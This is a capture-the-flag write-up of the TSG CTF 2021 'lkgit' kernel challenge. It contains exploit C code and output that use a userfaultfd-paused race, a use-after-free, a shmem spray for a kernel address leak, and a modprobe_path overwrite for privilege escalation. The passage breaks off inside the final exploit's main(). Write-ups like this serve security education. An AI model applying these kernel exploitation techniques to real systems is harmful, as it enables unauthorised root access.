<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="theme-color" content="#2ecc71">





<title>TSG CTF 2021 - lkgit | kileak</title>





<meta name="description" content="TSG CTF 2021 - lkgit">


<meta name="keywords" content="tsg, lkgit">



<link rel="stylesheet" href="/css/main.css">









<link rel="canonical" href="https://kileak.github.io/ctf/2021/tsg-lkgit/">
<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />



<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4PGFKKP0QW');
</script>


<script>base_url = "";</script>

  </head>
  <body class="">

    <main class="main-container">

        <header class="site-header">

  <div class="container txt-center">
    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
      <span></span>
      <span></span>
      <span></span>
    </a>

    <nav class="js-menu sliding-panel-content">
      <ul>
        <li><a href="/">home</a></li>
        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
      </ul>
    </nav>
    <div class="js-menu-screen sliding-panel-fade-screen"></div>

    <a href="/" class="author-thumb dot">
      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
    </a>

    <!--
    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
    </a>
    -->

    
      <h1 class="post-title">TSG CTF 2021 - lkgit</h1>
      <p class="post-meta">Oct 4, 2021</p>
    

  </div>

</header>


        <section class="main-content">
          <article class="post">

  <div class="post-content container">
    <blockquote>
  <p>lkgit
<!--break--></p>

  <p>Description</p>

  <p>The man made two wonderful software.
I make them worse and worse.</p>

  <p>The flag is /home/user/flag.</p>

  <p>nc 34.146.78.117 25252</p>

  <p>Attachment: <a href="https://kileak.github.io/assets/tsg21/lkgit/lkgit.tar.gz">lkgit.tar.gz</a> <a href="https://kileak.github.io/assets/tsg21/lkgit/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/tsg21/lkgit/pwn.c">pwn.c</a></p>

  <p>Team: Super Guesser</p>
</blockquote>

<p>lkgit was a kernel challenge mimicking a <code class="language-plaintext highlighter-rouge">git</code> system in kernel space. It allows us to add files with a commit message into kernel memory, retrieving them and updating the commit message.</p>

<p>The module can be accessed via <code class="language-plaintext highlighter-rouge">/dev/lkgit</code> and the functionality is handled via <code class="language-plaintext highlighter-rouge">ioctl</code> calls.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">long</span> <span class="nf">lkgit_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">){</span>
        <span class="k">case</span> <span class="n">LKGIT_HASH_OBJECT</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">lkgit_hash_object</span><span class="p">((</span><span class="n">hash_object</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">);</span>
        <span class="k">case</span> <span class="n">LKGIT_GET_OBJECT</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">lkgit_get_object</span><span class="p">((</span><span class="n">log_object</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">);</span>
        <span class="k">case</span> <span class="n">LKGIT_AMEND_MESSAGE</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">lkgit_amend_message</span><span class="p">((</span><span class="n">log_object</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">);</span>
        <span class="nl">default:</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">LKGIT_ERR_UNIMPLEMENTED</span><span class="p">;</span>
        <span class="p">};</span>
<span class="p">}</span></code></pre></figure>

<p>The main issue in the implementation is, that <code class="language-plaintext highlighter-rouge">lkgit_get_object</code> and <code class="language-plaintext highlighter-rouge">lkgit_amend_message</code> use <code class="language-plaintext highlighter-rouge">find_by_hash</code> to first get the index of the object to work on and store a reference to it, and then starts copying data to and from it.</p>

<p>Since there is no lock defined anywhere in the module, it’s possible to race this and for example abuse this in <code class="language-plaintext highlighter-rouge">lkgit_get_object</code> to delete the object after it was fetched, but before the data is copied from it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">long</span> <span class="nf">lkgit_get_object</span><span class="p">(</span><span class="n">log_object</span> <span class="o">*</span><span class="n">req</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">LKGIT_ERR_OBJECT_NOTFOUND</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">hash_other</span><span class="p">[</span><span class="n">HASH_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">char</span> <span class="n">hash</span><span class="p">[</span><span class="n">HASH_SIZE</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">target_ix</span><span class="p">;</span>
    <span class="n">hash_object</span> <span class="o">*</span><span class="n">target</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">hash</span><span class="p">,</span> <span class="n">HASH_SIZE</span><span class="p">))</span>
        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">target_ix</span> <span class="o">=</span> <span class="n">find_by_hash</span><span class="p">(</span><span class="n">hash</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">target</span> <span class="o">=</span> <span class="n">objects</span><span class="p">[</span><span class="n">target_ix</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="n">target</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="n">FILE_MAXSZ</span><span class="p">))</span>
            <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>

        <span class="c1">// validity check of hash</span>
        <span class="n">get_hash</span><span class="p">(</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="n">hash_other</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">hash_other</span><span class="p">,</span> <span class="n">HASH_SIZE</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>

        <span class="c1">// We would like execution to stop here</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span> <span class="n">target</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span> <span class="n">MESSAGE_MAXSZ</span><span class="p">))</span>  
            <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">hash</span><span class="p">,</span> <span class="n">target</span><span class="o">-&gt;</span><span class="n">hash</span><span class="p">,</span> <span class="n">HASH_SIZE</span><span class="p">))</span>
            <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

<span class="nl">end:</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>To make racing easier, we can use <code class="language-plaintext highlighter-rouge">userfaultfd</code>.</p>

<p>If we can stop execution of <code class="language-plaintext highlighter-rouge">lkgit_get_object</code> before the <code class="language-plaintext highlighter-rouge">hash</code> gets copied back into the user object and delete the object and replace it with some kernel object, that contains useful data in the first <code class="language-plaintext highlighter-rouge">0x10</code> bytes and then continue execution, we could use this to leak kernel addresses.</p>

<p>Perfect situation for using <code class="language-plaintext highlighter-rouge">userfaultfd</code>, setting up some pages and put our request object into that region, so that the kernel module can read <code class="language-plaintext highlighter-rouge">hash</code> and <code class="language-plaintext highlighter-rouge">content</code> from it, but will run into a page fault when trying to read <code class="language-plaintext highlighter-rouge">message</code>. This way, execution in the kernel module would pause at the desired point and transfer execution into our <code class="language-plaintext highlighter-rouge">userfault</code> handler (where we can delete the current object and replace it with a kernel object) and then trigger <code class="language-plaintext highlighter-rouge">UFFDIO_COPY</code>, so execution will continue in the kernel module, copying the first <code class="language-plaintext highlighter-rouge">0x10</code> bytes from that kernel object into our user <code class="language-plaintext highlighter-rouge">hash</code> value.</p>

<p>I’ll not go too deep into how to setup <code class="language-plaintext highlighter-rouge">userfaultfd</code> for this writeup (just check attached <code class="language-plaintext highlighter-rouge">pwn.c</code> how this is done, I added logs and comments to the userfault handling to make it very verbose).</p>

<p>Let’s start with preparing the leak for a kernel address. For this, we want to create an initial file, then try to request it and let the request page fault, when trying to fill the message of our request.</p>

<p>We create a page of size <code class="language-plaintext highlighter-rouge">0x2000</code> and align our request object in this page, so that <code class="language-plaintext highlighter-rouge">hash</code> and <code class="language-plaintext highlighter-rouge">content</code> are located in the first page and the <code class="language-plaintext highlighter-rouge">message</code> object in the second page.</p>

<p>By this, <code class="language-plaintext highlighter-rouge">lkgit_get_object</code> will trigger a page fault, when trying to write to <code class="language-plaintext highlighter-rouge">message</code>, passing execution to our <code class="language-plaintext highlighter-rouge">userfault</code> handler.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// take a snapshot of a file.</span>
<span class="kt">char</span> <span class="nf">snap_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">content</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">out_hash</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">hash_object</span> <span class="n">req</span> <span class="o">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="p">,</span>
        <span class="p">.</span><span class="n">message</span> <span class="o">=</span> <span class="n">message</span><span class="p">,</span>
    <span class="p">};</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">lkgit_fd</span><span class="p">,</span> <span class="n">LKGIT_HASH_OBJECT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[ERROR] failed to hash the object.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">out_hash</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">.</span><span class="n">hash</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">fileContent1</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">fileMessage1</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"BBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="p">;</span>

<span class="kt">char</span> <span class="n">hash1</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>

<span class="kt">void</span> <span class="o">*</span><span class="nf">break_on_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="o">*</span><span class="n">uf_buf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">userfd_callback_args</span> <span class="o">*</span><span class="n">cb_args</span> <span class="o">=</span> <span class="n">args</span><span class="p">;</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Userfault: break_on_read"</span><span class="p">);</span>    
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">lkgit_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/lkgit"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create initial file in lkgit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">snap_file</span><span class="p">(</span><span class="n">fileContent1</span><span class="p">,</span> <span class="n">fileMessage1</span><span class="p">,</span> <span class="n">hash1</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Register userfault fd</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">userfd_callback_args</span> <span class="o">*</span><span class="n">uffdargs</span> <span class="o">=</span> <span class="n">register_userfaultfd</span><span class="p">(</span><span class="n">UFFDIO_REGISTER_MODE_MISSING</span> <span class="o">|</span> <span class="n">UFFDIO_REGISTER_MODE_WP</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">break_on_read</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Request file, and let it break on copying back message</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">log_object</span> <span class="o">*</span><span class="n">req</span> <span class="o">=</span> <span class="n">uffdargs</span><span class="o">-&gt;</span><span class="n">page_start</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// Allow copy hash/content, but pagefault on message</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">hash</span><span class="p">,</span> <span class="n">hash1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">lkgit_fd</span><span class="p">,</span> <span class="n">LKGIT_GET_OBJECT</span><span class="p">,</span> <span class="n">req</span><span class="p">);</span>

    <span class="n">close</span><span class="p">(</span><span class="n">lkgit_fd</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Create initial file in lkgit
[+] Register userfault fd

Register userfaultdfd
======================================================================
[+] Userfaultfd registered : FD 4 / Flags: 0x1
[+] Userfaultfd api : Features 0x1ff
[+] Userfaultfd region : 0x7fc3e3f5f000 - 0x7fc3e3f61000[+] Userfaultfd region registered: ioctls 0x5c
[+] Userfaultfd process thread started: 0x7fc3e3f58f38
======================================================================

[+] Request file, and let it break on copying back message
Userfault event
======================================================================
PAGEFAULT : 0x7fc3e3f60000 / Flags 0x1
UFFDIO_COPY
Userfault: break_on_read</code></pre></figure>

<p>So, now we’re in our userfault handler <code class="language-plaintext highlighter-rouge">break_on_read</code>, while the <code class="language-plaintext highlighter-rouge">lkgit_get_object</code> function has already fetched the object to return, we can now just store another file with the same hash in the kernel. This will effectively delete the current object and store a new one there. While the object is deleted, let’s put a <code class="language-plaintext highlighter-rouge">shmem</code> struct there and return to execution in <code class="language-plaintext highlighter-rouge">lkgit_get_object</code>, which will then copy the first <code class="language-plaintext highlighter-rouge">0x10</code> bytes from the <code class="language-plaintext highlighter-rouge">shmem</code> kernel object into the hash of our request.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">spray_shmem</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] spray shmem structs"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">shmid</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">shmaddr</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">shmid</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mo">0600</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"shmget error"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">shmaddr</span> <span class="o">=</span> <span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">shmaddr</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"shmat error"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="o">*</span><span class="nf">break_on_read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="o">*</span><span class="n">uf_buf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">userfd_callback_args</span> <span class="o">*</span><span class="n">cb_args</span> <span class="o">=</span> <span class="n">args</span><span class="p">;</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"Userfault: break_on_read"</span><span class="p">);</span>    

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Delete current object by storing one with the same hash</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">snap_file</span><span class="p">(</span><span class="n">fileContent1</span><span class="p">,</span> <span class="n">fileMessage1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hash1</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create a shmem struct in the freed object"</span><span class="p">);</span>
    <span class="n">spray_shmem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>    
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">lkgit_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/lkgit"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Create initial file in lkgit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">snap_file</span><span class="p">(</span><span class="n">fileContent1</span><span class="p">,</span> <span class="n">fileMessage1</span><span class="p">,</span> <span class="n">hash1</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Register userfault fd</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">userfd_callback_args</span> <span class="o">*</span><span class="n">uffdargs</span> <span class="o">=</span> <span class="n">register_userfaultfd</span><span class="p">(</span><span class="n">UFFDIO_REGISTER_MODE_MISSING</span> <span class="o">|</span> <span class="n">UFFDIO_REGISTER_MODE_WP</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">break_on_read</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Request file, and let it break on copying back message</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">log_object</span> <span class="o">*</span><span class="n">req</span> <span class="o">=</span> <span class="n">uffdargs</span><span class="o">-&gt;</span><span class="n">page_start</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// Allow copy hash/content, but pagefault on message</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">hash</span><span class="p">,</span> <span class="n">hash1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">lkgit_fd</span><span class="p">,</span> <span class="n">LKGIT_GET_OBJECT</span><span class="p">,</span> <span class="n">req</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel_leak</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">));</span>
    <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kernel_leak</span> <span class="o">-</span> <span class="mh">0x131ce0</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel leak : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel_leak</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] modprobe_path : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe_path</span><span class="p">);</span>

    <span class="n">unregister_userfaultfd</span><span class="p">(</span><span class="n">uffdargs</span><span class="p">);</span>

    <span class="n">close</span><span class="p">(</span><span class="n">lkgit_fd</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Let’s see some bad drawing skills for getting a better idea :)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"> request object
      ||
      ||
      \/
lkgit_get_object
      ||
      ||
      \/
 find_by_hash
      ||
      ||
      \/
 copy_to_user(content)    
      ||
      ||
      \/
 copy_to_user(message)
      ||
      ||     (page fault)
      ||==============================&gt; userfaulthandler (break on read)
                                                   ||
                                                   ||
                                                   \/
                                            delete current object
                                                   ||
                                                   ||
                                                   \/
                                            create shmem struct
                                                   ||
                                                   ||
      ||&lt;============================================                                             
      ||
      ||
      \/
 copy_to_user(hash)</code></pre></figure>

<p>So the last <code class="language-plaintext highlighter-rouge">copy_to_user</code> will actually work on the <code class="language-plaintext highlighter-rouge">shmem</code> structure which we sneaked into the (deleted) current object in our userfault handler, so we can leak a kernel address from it.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Request file, and let it break on copying back message
Userfault event
======================================================================
PAGEFAULT : 0x7f410a0f7000 / Flags 0x1
UFFDIO_COPY
Userfault: break_on_read
[+]Delete current object by storing one with the same hash
[+] Create a shmem struct in the freed object[+] spray shmem structs
[+] Kernel leak : 0xffffffff81d6e800</code></pre></figure>

<p>Now that we have a kernel leak, we need to do the opposite way around to be able to write something. Similar to our leaking process, we can use <code class="language-plaintext highlighter-rouge">lkgit_amend_message</code> and also “pause” it after acquiring the object, when it tries to read the message to write to the kernel object.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">long</span> <span class="nf">lkgit_amend_message</span><span class="p">(</span><span class="n">log_object</span> <span class="o">*</span><span class="n">reqptr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">LKGIT_ERR_OBJECT_NOTFOUND</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">MESSAGE_MAXSZ</span><span class="p">];</span>
    <span class="n">log_object</span> <span class="n">req</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">int</span> <span class="n">target_ix</span><span class="p">;</span>
    <span class="n">hash_object</span> <span class="o">*</span><span class="n">target</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="n">reqptr</span><span class="o">-&gt;</span><span class="n">hash</span><span class="p">,</span> <span class="n">HASH_SIZE</span><span class="p">))</span>
        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">target_ix</span> <span class="o">=</span> <span class="n">find_by_hash</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">hash</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">target</span> <span class="o">=</span> <span class="n">objects</span><span class="p">[</span><span class="n">target_ix</span><span class="p">];</span>

        <span class="c1">// save message temporarily</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">reqptr</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span> <span class="n">MESSAGE_MAXSZ</span><span class="p">))</span>  <span class="c1">// &lt;= break here :)</span>
            <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>

        <span class="c1">// return old information of object</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">lkgit_get_object</span><span class="p">(</span><span class="n">reqptr</span><span class="p">);</span>

        <span class="c1">// amend message</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">MESSAGE_MAXSZ</span><span class="p">);</span>
    <span class="p">}</span>

<span class="nl">end:</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>We can then delete the current object and allocate another object, so that the message from this will be allocated over our current object (by which we can control the <code class="language-plaintext highlighter-rouge">target-&gt;message</code> pointer for the current object in <code class="language-plaintext highlighter-rouge">lkgit_amend_message</code>).</p>

<p>When we then continue execution, our new message will be copied to our crafted <code class="language-plaintext highlighter-rouge">target-&gt;message</code> buffer instead of the original one.</p>

<p>Since the kernel configuration didn’t prohibit usage of <code class="language-plaintext highlighter-rouge">usermode_helper</code>, I opted for overwriting <code class="language-plaintext highlighter-rouge">modprobe_path</code> and then let it copy the flag and change it permissions, so we can easily read it afterwards.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="nf">break_on_read_overwrite</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="o">*</span><span class="n">uf_buf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">userfd_callback_args</span> <span class="o">*</span><span class="n">cb_args</span> <span class="o">=</span> <span class="n">args</span><span class="p">;</span>

    <span class="c1">// Write address of modprobe_path to hash_object-&gt;message</span>
    <span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span> <span class="n">lptr</span> <span class="o">=</span> <span class="n">fileMessage1</span><span class="o">+</span><span class="mh">0x18</span><span class="p">;</span>
    <span class="o">*</span><span class="n">lptr</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
    
    <span class="c1">// Reallocate file to get current object freed</span>
    <span class="n">snap_file</span><span class="p">(</span><span class="n">fileContent1</span><span class="p">,</span> <span class="n">fileMessage1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hash1</span><span class="p">);</span>

    <span class="c1">// Reallocate file to overwrite current freed object with crafted message</span>
    <span class="c1">// =&gt; overwrite message ptr of current object</span>
    <span class="n">snap_file</span><span class="p">(</span><span class="n">fileContent1</span><span class="p">,</span> <span class="n">fileMessage1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hash1</span><span class="p">);</span>
        
    <span class="c1">// Put the content into UFFDIO_COPY src argument (which will be copied to corrupted message ptr)</span>
    <span class="kt">char</span> <span class="n">mod</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/home/user/copy.sh"</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">uf_buf</span><span class="o">-&gt;</span><span class="n">src</span><span class="p">,</span> <span class="n">mod</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mod</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// Prepare modprobe_path exploitation</span>
